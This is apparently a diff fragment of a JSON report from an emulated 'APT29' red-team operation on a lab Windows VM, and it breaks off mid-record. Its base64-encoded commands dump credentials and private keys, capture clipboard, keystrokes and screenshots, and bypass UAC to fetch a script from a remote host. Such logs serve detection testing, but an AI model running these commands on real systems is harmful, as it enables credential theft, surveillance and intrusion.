+    "command": "aWYgKCEgJCh0ZXN0LXBhdGggLXBhdGggIkM6XFByb2dyYW0gRmlsZXNcU3lzaW50ZXJuYWxzU3VpdGUiKSkgeyAgd3JpdGUtaG9zdCAiWyFdIFRoZSBwYXRoIEM6XFByb2dyYW0gRmlsZXNcU3lzaW50ZXJuYWxzU3VpdGUgZG9lcyBub3QgZXhpc3QuIEV4ZWN1dGlvbiBoYXMgc3RvcHBlZC4iOyAgZXhpdCAxO31TZXQtTG9jYXRpb24gLXBhdGggIkM6XFByb2dyYW0gRmlsZXNcU3lzaW50ZXJuYWxzU3VpdGUiOy4vYWNjZXNzY2hrLmV4ZSAtYWNjZXB0ZXVsYSAuOw==",
+    "delegated_timestamp": "2022-09-29T19:56:03Z",
+    "collected_timestamp": "2022-09-29T19:57:06Z",
+    "finished_timestamp": "2022-09-29T19:57:07Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": 7716,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "e7cab9bb-3e3a-4d93-99cc-3593c1dc8c6d",
+      "ability_name": "Credentials In Files- Chrome",
+      "ability_description": "Obtain credentials from Chrome Dumper"
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "credential-access",
+      "technique_name": "Credential Dumping",
+      "technique_id": "T1003"
+    },
+    "agent_reported_time": "2022-09-29T19:57:06Z"
+  },
+  {
+    "command": "c3lzdGVtaW5mbw==",
+    "delegated_timestamp": "2022-09-29T19:56:03Z",
+    "collected_timestamp": "2022-09-29T19:56:47Z",
+    "finished_timestamp": "2022-09-29T19:56:50Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "cmd",
+    "pid": 2896,
+    "agent_metadata": {
+      "paw": "wpouwj",
+      "group": "diy_eval",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.exe",
+      "pid": 4732,
+      "ppid": 6512,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:47:51Z"
+    },
+    "ability_metadata": {
+      "ability_id": "d2ea2676-7f85-4228-b980-ab3c0e1adc03",
+      "ability_name": "System Information Discovery (2) (2) (2)",
+      "ability_description": "The systeminfo utility is executed via cmd to enumerate local operating system configuration."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "System Information Discovery",
+      "technique_id": "T1082"
+    },
+    "agent_reported_time": "2022-09-29T19:56:47Z"
+  },
+  {
+    "command": "SW1wb3J0LVBmeENlcnRpZmljYXRlIC1FeHBvcnRhYmxlIC1GaWxlUGF0aCAiLlxkbWV2YWxzLmxvY2FsLnBmeCIgLUNlcnRTdG9yZUxvY2F0aW9uIENlcnQ6XExvY2FsTWFjaGluZVxNeTtpZiAoISAkKHRlc3QtcGF0aCAtcGF0aCAiQzpcUHJvZ3JhbSBGaWxlc1xTeXNpbnRlcm5hbHNTdWl0ZSIpKSB7ICB3cml0ZS1ob3N0ICJbIV0gVGhlIHBhdGggQzpcUHJvZ3JhbSBGaWxlc1xTeXNpbnRlcm5hbHNTdWl0ZSBkb2VzIG5vdCBleGlzdC4gRXhlY3V0aW9uIGhhcyBzdG9wcGVkLiI7ICBleGl0IDE7fVNldC1Mb2NhdGlvbiAtcGF0aCAiQzpcUHJvZ3JhbSBGaWxlc1xTeXNpbnRlcm5hbHNTdWl0ZSI7LiAuXHJlYWRtZS5wczE7R2V0LVByaXZhdGVLZXlzO2lmICgkPyAtZXEgJFRydWUpIHsgICAgd3JpdGUtaG9zdCAiWytdIFN1Y2Nlc3NmdWxseSBleGVjdXRlZCBwcml2YXRlIGtleSBjb2xsZWN0aW9uIHNjcmlwdC4iOyAgICBleGl0IDA7fSBlbHNlIHsgICAgd3JpdGUtaG9zdCAiWyFdIEVycm9yLCBjb3VsZCBub3QgZXhlY3V0aW9uIEdldC1Qcml2YXRlS2V5cy4iOyAgICBleGl0IDE7fQ==",
+    "delegated_timestamp": "2022-09-29T19:57:09Z",
+    "collected_timestamp": "2022-09-29T19:57:46Z",
+    "finished_timestamp": "2022-09-29T19:57:50Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": 1684,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "c4f4b13c-87b6-498c-b814-93570173068c",
+      "ability_name": "Credentials In Files (T1081) - Private Keys Extraction",
+      "ability_description": "Obtain credentials via Custom PowerShell"
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "credential-access",
+      "technique_name": "Unsecured Credentials: Private Keys",
+      "technique_id": "T1552.004"
+    },
+    "agent_reported_time": "2022-09-29T19:57:46Z"
+  },
+  {
+    "command": "bmV0IGNvbmZpZyB3b3Jrc3RhdGlvbg==",
+    "delegated_timestamp": "2022-09-29T19:57:09Z",
+    "collected_timestamp": "2022-09-29T19:57:23Z",
+    "finished_timestamp": "2022-09-29T19:57:23Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "cmd",
+    "pid": 6132,
+    "agent_metadata": {
+      "paw": "wpouwj",
+      "group": "diy_eval",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.exe",
+      "pid": 4732,
+      "ppid": 6512,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:47:51Z"
+    },
+    "ability_metadata": {
+      "ability_id": "7c2a6e5b-1adb-464f-a581-4677391f8dd6",
+      "ability_name": "System Information Discovery (2) (2)",
+      "ability_description": "The net utility is executed via cmd to enumerate local operating system configuration."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "System Information Discovery",
+      "technique_id": "T1082"
+    },
+    "agent_reported_time": "2022-09-29T19:57:23Z"
+  },
+  {
+    "command": "aWYgKCEgJCh0ZXN0LXBhdGggLXBhdGggIkM6XFByb2dyYW0gRmlsZXNcU3lzSW50ZXJuYWxzU3VpdGUiKSkgeyAgd3JpdGUtaG9zdCAiWyFdIFRoZSBwYXRoIEM6XFByb2dyYW0gRmlsZXNcU3lzSW50ZXJuYWxzU3VpdGUgZG9lcyBub3QgZXhpc3QuIEV4ZWN1dGlvbiBoYXMgc3RvcHBlZC4iOyAgZXhpdCAxO31TZXQtTG9jYXRpb24gLXBhdGggIkM6XFByb2dyYW0gRmlsZXNcU3lzSW50ZXJuYWxzU3VpdGUiO2lmICh0ZXN0LXBhdGggLXBhdGggIi5ccHN2ZXJzaW9uLnR4dCIgKSB7ICBtb3ZlLWl0ZW0gLlxwc3ZlcnNpb24udHh0IHBzdmVyc2lvbi5wczEgLUZvcmNlO30gIHdyaXRlLWhvc3QgIlsrXSBGaWxlIHBzdmVyc2lvbi5wczEgc3RhZ2VkIHRvIGJlIGltcG9ydGVkLiI=",
+    "delegated_timestamp": "2022-09-29T19:57:54Z",
+    "collected_timestamp": "2022-09-29T19:58:45Z",
+    "finished_timestamp": "2022-09-29T19:58:46Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": 3376,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "a4b14c10-49aa-4ae4-b165-d5a37364fe62",
+      "ability_name": "Staging files for PowerShell module imports",
+      "ability_description": "Renaming psversion.txt to psversion.txt to be imported"
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "defensive-evasion",
+      "technique_name": "Masquerading: Match Legitimate Name or Location",
+      "technique_id": "T1036.005"
+    },
+    "agent_reported_time": "2022-09-29T19:58:45Z"
+  },
+  {
+    "command": "bmV0IGxvY2FsZ3JvdXAgYWRtaW5pc3RyYXRvcnM=",
+    "delegated_timestamp": "2022-09-29T19:57:54Z",
+    "collected_timestamp": "2022-09-29T19:58:05Z",
+    "finished_timestamp": "2022-09-29T19:58:05Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "cmd",
+    "pid": 7012,
+    "agent_metadata": {
+      "paw": "wpouwj",
+      "group": "diy_eval",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.exe",
+      "pid": 4732,
+      "ppid": 6512,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:47:51Z"
+    },
+    "ability_metadata": {
+      "ability_id": "faa96e7f-081a-40b7-a743-a6a7f2627ea3",
+      "ability_name": "Permissions Groups Discovery (2) (2)",
+      "ability_description": "The net utility is executed via cmd to enumerate members of the local system's administrators group."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "Permission Groups Discovery",
+      "technique_id": "T1069"
+    },
+    "agent_reported_time": "2022-09-29T19:58:05Z"
+  },
+  {
+    "command": "aWYgKCEgJCh0ZXN0LXBhdGggLXBhdGggIkM6XFByb2dyYW0gRmlsZXNcU3lzaW50ZXJuYWxzU3VpdGVccHN2ZXJzaW9uLnBzMSI7KSkgeyAgd3JpdGUtaG9zdCAiWyFdIFRoZSBwYXRoIEM6XFByb2dyYW0gRmlsZXNcU3lzaW50ZXJuYWxzU3VpdGVccHN2ZXJzaW9uLnBzMSBkb2VzIG5vdCBleGlzdC4gRXhlY3V0aW9uIGhhcyBzdG9wcGVkLiI7ICBleGl0IDE7fVNldC1Mb2NhdGlvbiAtcGF0aCAiQzpcUHJvZ3JhbSBGaWxlc1xTeXNpbnRlcm5hbHNTdWl0ZSI7LiAuXHBzdmVyc2lvbi5wczE7SW52b2tlLVNjcmVlbkNhcHR1cmU7IFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDM7IFZpZXctSm9iIC1Kb2JOYW1lICJTY3JlZW5zaG90Ijs=",
+    "delegated_timestamp": "2022-09-29T19:58:49Z",
+    "collected_timestamp": "2022-09-29T19:59:49Z",
+    "finished_timestamp": "2022-09-29T19:59:54Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": 7804,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "a81ea4ad-bc9f-49a7-82d4-4466df641487",
+      "ability_name": "Screen Capturing",
+      "ability_description": "Load custom PowerShell module and take screenshots."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "collection",
+      "technique_name": "Screen Capture",
+      "technique_id": "T1113"
+    },
+    "agent_reported_time": "2022-09-29T19:59:49Z"
+  },
+  {
+    "command": "bmV0IGxvY2FsZ3JvdXAgYWRtaW5pc3RyYXRvcnMgL2RvbWFpbg==",
+    "delegated_timestamp": "2022-09-29T19:58:49Z",
+    "collected_timestamp": "2022-09-29T19:59:09Z",
+    "finished_timestamp": "2022-09-29T19:59:09Z",
+    "status": 1,
+    "platform": "windows",
+    "executor": "cmd",
+    "pid": 7988,
+    "agent_metadata": {
+      "paw": "wpouwj",
+      "group": "diy_eval",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.exe",
+      "pid": 4732,
+      "ppid": 6512,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:47:51Z"
+    },
+    "ability_metadata": {
+      "ability_id": "26181249-be75-41ed-9fe7-5c30ea8c2d4d",
+      "ability_name": "Permissions Groups Discovery",
+      "ability_description": "The net utility is executed via cmd to enumerate members of the domain controller’s administrators group."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "Permission Groups Discovery",
+      "technique_id": "T1069"
+    },
+    "agent_reported_time": "2022-09-29T19:59:09Z"
+  },
+  {
+    "command": "JGNsaXBfZGF0YT1nZXQtY2xpcGJvYXJkO2lmICgkY2xpcF9kYXRhLkxlbmd0aCAtZ3QgMCkgeyAgd3JpdGUtaG9zdCAiWytdIENsaXBib2FyZCBkYXRhIG9idGFpbmVkIVxuIjsgIHdyaXRlLWhvc3QgJGNsaXBfZGF0YTt9IGVsc2UgeyAgd3JpdGUtaG9zdCAiWyFdIE5vIGNsaXBib2FyZCBkYXRhIGF2YWlsYWJsZSFcbiI7fQ==",
+    "delegated_timestamp": "2022-09-29T19:59:55Z",
+    "collected_timestamp": "2022-09-29T20:00:26Z",
+    "finished_timestamp": "2022-09-29T20:00:27Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": 4256,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "ee4c2eab-be57-434c-a32c-14b77360301a",
+      "ability_name": "Automated Collection (T1119) - Clipboard (T1115)",
+      "ability_description": "Get contents of clipboard"
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "collection",
+      "technique_name": "Clipboard Data",
+      "technique_id": "T1115"
+    },
+    "agent_reported_time": "2022-09-29T20:00:26Z"
+  },
+  {
+    "command": "Y21kLmV4ZSAvYyBuZXQgZ3JvdXAgIkRvbWFpbiBBZG1pbnMiIC9kb21haW4=",
+    "delegated_timestamp": "2022-09-29T19:59:55Z",
+    "collected_timestamp": "2022-09-29T20:00:27Z",
+    "finished_timestamp": "2022-09-29T20:00:27Z",
+    "status": 1,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": 7940,
+    "agent_metadata": {
+      "paw": "wpouwj",
+      "group": "diy_eval",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.exe",
+      "pid": 4732,
+      "ppid": 6512,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:47:51Z"
+    },
+    "ability_metadata": {
+      "ability_id": "84377d7a-0363-44fd-a082-44657ca1858f",
+      "ability_name": "Permissions Groups Discovery (2)",
+      "ability_description": "The net utility is executed via cmd to enumerate members of the domain administrators group."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "Permission Groups Discovery",
+      "technique_id": "T1069"
+    },
+    "agent_reported_time": "2022-09-29T20:00:27Z"
+  },
+  {
+    "command": "aWYgKCEgJCh0ZXN0LXBhdGggLXBhdGggIkM6XFByb2dyYW0gRmlsZXNcU3lzaW50ZXJuYWxzU3VpdGUiKSkgeyAgd3JpdGUtaG9zdCAiWyFdIFRoZSBwYXRoIEM6XFByb2dyYW0gRmlsZXNcU3lzaW50ZXJuYWxzU3VpdGUgZG9lcyBub3QgZXhpc3QuIEV4ZWN1dGlvbiBoYXMgc3RvcHBlZC4iOyAgZXhpdCAxO31TZXQtTG9jYXRpb24gLXBhdGggIkM6XFByb2dyYW0gRmlsZXNcU3lzaW50ZXJuYWxzU3VpdGUiOy4gLlxwc3ZlcnNpb24ucHMxO0dldC1LZXlzdHJva2VzO1N0YXJ0LVNsZWVwIC1TZWNvbmRzIDE1O1ZpZXctSm9iIC1Kb2JOYW1lICJLZXlzdHJva2VzIjs=",
+    "delegated_timestamp": "2022-09-29T20:00:30Z",
+    "collected_timestamp": "2022-09-29T20:01:20Z",
+    "finished_timestamp": "2022-09-29T20:01:36Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": 1340,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "db28f68d-e8b8-46e6-b680-642570d4b257",
+      "ability_name": "Automated Collection (T1119) - Input Capture (T1417)",
+      "ability_description": "Load custom PowerShell module, and grab keystrokes for 15 seconds."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "collection",
+      "technique_name": "Input Capture: Keylogging",
+      "technique_id": "T1056.001"
+    },
+    "agent_reported_time": "2022-09-29T20:01:19Z"
+  },
+  {
+    "command": "bmV0IHVzZXIgL2RvbWFpbg==",
+    "delegated_timestamp": "2022-09-29T20:00:30Z",
+    "collected_timestamp": "2022-09-29T20:01:24Z",
+    "finished_timestamp": "2022-09-29T20:01:24Z",
+    "status": 1,
+    "platform": "windows",
+    "executor": "cmd",
+    "pid": 2760,
+    "agent_metadata": {
+      "paw": "wpouwj",
+      "group": "diy_eval",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.exe",
+      "pid": 4732,
+      "ppid": 6512,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:47:51Z"
+    },
+    "ability_metadata": {
+      "ability_id": "61221fb9-cb32-46d5-98fd-90567a621526",
+      "ability_name": "Account Discovery",
+      "ability_description": "The net utility is executed via cmd to enumerate domain user accounts."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "Account Discovery",
+      "technique_id": "T1087"
+    },
+    "agent_reported_time": "2022-09-29T20:01:24Z"
+  },
+  {
+    "command": "aWYgKCEgJCh0ZXN0LXBhdGggLXBhdGggIkM6XFByb2dyYW0gRmlsZXNcU3lzaW50ZXJuYWxzU3VpdGUiKSkgeyAgd3JpdGUtaG9zdCAiWyFdIFRoZSBwYXRoIEM6XFByb2dyYW0gRmlsZXNcU3lzaW50ZXJuYWxzU3VpdGUgZG9lcyBub3QgZXhpc3QuIEV4ZWN1dGlvbiBoYXMgc3RvcHBlZC4iOyAgZXhpdCAxO31TZXQtTG9jYXRpb24gLXBhdGggIkM6XFByb2dyYW0gRmlsZXNcU3lzaW50ZXJuYWxzU3VpdGUiOy4gLlxwc3ZlcnNpb24ucHMxO0FkLVNlYXJjaCBDb21wdXRlciBOYW1lICo7",
+    "delegated_timestamp": "2022-09-29T20:01:40Z",
+    "collected_timestamp": "2022-09-29T20:02:13Z",
+    "finished_timestamp": "2022-09-29T20:02:22Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": 7664,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "95564347-e77a-4a89-b08f-dcafa5468f2c",
+      "ability_name": "Remote System Discovery (T1018)",
+      "ability_description": "Custom PowerShell script to perform AD triage for domain bound computers."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "execution",
+      "technique_name": "Command and Scripting Interpreter: PowerShell",
+      "technique_id": "T1059.001"
+    },
+    "agent_reported_time": "2022-09-29T20:02:12Z"
+  },
+  {
+    "command": "bmV0IHVzZXIgJVVTRVJOQU1FJSAvZG9tYWlu",
+    "delegated_timestamp": "2022-09-29T20:01:41Z",
+    "collected_timestamp": "2022-09-29T20:02:08Z",
+    "finished_timestamp": "2022-09-29T20:02:08Z",
+    "status": 1,
+    "platform": "windows",
+    "executor": "cmd",
+    "pid": 3520,
+    "agent_metadata": {
+      "paw": "wpouwj",
+      "group": "diy_eval",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.exe",
+      "pid": 4732,
+      "ppid": 6512,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:47:51Z"
+    },
+    "ability_metadata": {
+      "ability_id": "9ce5bf9f-44ec-44c4-bbe0-6d68a83e1b76",
+      "ability_name": "Account Discovery (2)",
+      "ability_description": "The net utility is executed via cmd to enumerate detailed information about a specific user account."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "Account Discovery",
+      "technique_id": "T1087"
+    },
+    "agent_reported_time": "2022-09-29T20:02:08Z"
+  },
+  {
+    "command": "SW52b2tlLUNvbW1hbmQgLUNvbXB1dGVyTmFtZSAiJChob3N0bmFtZSkiIC1TY3JpcHRCbG9jayB7IEdldC1Qcm9jZXNzIC1JbmNsdWRlVXNlck5hbWUgfCBTZWxlY3QtT2JqZWN0IFVzZXJOYW1lLFNlc3Npb25JZCB8IFdoZXJlLU9iamVjdCB7ICRfLlVzZXJOYW1lIC1saWtlICIqXCRlbnY6VVNFUk5BTUUiIH0gfCBTb3J0LU9iamVjdCBTZXNzaW9uSWQgLVVuaXF1ZSB9IHwgU2VsZWN0LU9iamVjdCBVc2VyTmFtZSxTZXNzaW9uSWQgLUxhc3QgMTs=",
+    "delegated_timestamp": "2022-09-29T20:02:26Z",
+    "collected_timestamp": "2022-09-29T20:03:01Z",
+    "finished_timestamp": "2022-09-29T20:03:02Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": 7084,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "c4a59e39-53b0-4ace-9528-8ff052752ece",
+      "ability_name": "Identifying current user on other machines",
+      "ability_description": "Custom PowerShell script to perform AD triage for domain bound computers."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "execution",
+      "technique_name": "Command and Scripting Interpreter: PowerShell",
+      "technique_id": "T1059.001"
+    },
+    "agent_reported_time": "2022-09-29T20:03:00Z"
+  },
+  {
+    "command": "cmVnIHF1ZXJ5IEhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVt",
+    "delegated_timestamp": "2022-09-29T20:02:26Z",
+    "collected_timestamp": "2022-09-29T20:02:44Z",
+    "finished_timestamp": "2022-09-29T20:02:44Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "cmd",
+    "pid": 7596,
+    "agent_metadata": {
+      "paw": "wpouwj",
+      "group": "diy_eval",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.exe",
+      "pid": 4732,
+      "ppid": 6512,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:47:51Z"
+    },
+    "ability_metadata": {
+      "ability_id": "5c23f638-9cfc-4fc4-9cab-4af628fef70a",
+      "ability_name": "Query Registry (2) (2) (2)",
+      "ability_description": "The reg utility is executed via cmd to enumerate a specific Registry key associated with local system policies to ensure that the user will not be prompted for credentials when elevating permissions."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "discovery",
+      "technique_name": "Query Registry",
+      "technique_id": "T1012"
+    },
+    "agent_reported_time": "2022-09-29T20:02:44Z"
+  },
+  {
+    "command": "SW1wb3J0LU1vZHVsZSAuXEdldC1TY3JlZW5zaG90LnBzMSAtVmVyYm9zZSAtRm9yY2U7R2V0LVNjcmVlbnNob3Q7",
+    "delegated_timestamp": "2022-09-29T20:03:06Z",
+    "collected_timestamp": "2022-09-29T20:03:39Z",
+    "finished_timestamp": "2022-09-29T20:03:39Z",
+    "status": 0,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": 892,
+    "agent_metadata": {
+      "paw": "qfpaqy",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
+      "location": "C:\\Users\\Public\\sandcat.go-windows.exe",
+      "pid": 5476,
+      "ppid": 1732,
+      "privilege": "Elevated",
+      "host": "win10",
+      "contact": "HTTP",
+      "created": "2022-09-29T19:23:25Z"
+    },
+    "ability_metadata": {
+      "ability_id": "0b1841bd-ef8b-475c-bce7-8fcb2860984a",
+      "ability_name": "Screen Capture (T1113)",
+      "ability_description": "Native API call(s) were used to collect a screenshot."
+    },
+    "operation_metadata": {
+      "operation_name": "FJ-APT29",
+      "operation_start": "2022-09-29T19:31:11Z",
+      "operation_adversary": "APT 29 - Modified"
+    },
+    "attack_metadata": {
+      "tactic": "collection",
+      "technique_name": "Screen Capture",
+      "technique_id": "T1113"
+    },
+    "agent_reported_time": "2022-09-29T20:03:38Z"
+  },
+  {
+    "command": "SW1wb3J0LU1vZHVsZSAuXEludm9rZS1CeXBhc3NVQUNUb2tlbk1hbmlwdWxhdGlvbi5wczEgLVZlcmJvc2UgLUZvcmNlO01vdmUtSXRlbSAtUGF0aCAuXHVwZGF0ZS5wczEgLURlc3RpbmF0aW9uICRlbnY6QVBQREFUQSAtRm9yY2U7JHBjb2RlID0gW1N5c3RlbS5Db252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRCeXRlcygiSW1wb3J0LU1vZHVsZSAkZW52OkFQUERBVEFcdXBkYXRlLnBzMTt1cGRhdGUoJ2h0dHA6Ly8xOTIuMTY4LjU2LjEwNDo4ODg4JykiKSk7SW52b2tlLUJ5cGFzc1VBQ1Rva2VuTWFuaXB1bGF0aW9uIC1Bcmd1bWVudHMgIi1ub3AgLWV4ZWMgYnlwYXNzIC1FbmNvZGVkQ29tbWFuZCAkcGNvZGUiIC1WZXJib3Nl",
+    "delegated_timestamp": "2022-09-29T20:03:06Z",
+    "collected_timestamp": "2022-09-29T20:04:35Z",
+    "finished_timestamp": "2022-09-29T20:04:39Z",
+    "status": 1,
+    "platform": "windows",
+    "executor": "psh",
+    "pid": 1728,
+    "agent_metadata": {
+      "paw": "wpouwj",
+      "group": "diy_eval",
+      "architecture": "amd64",
+      "username": "WIN10\\vagrant",
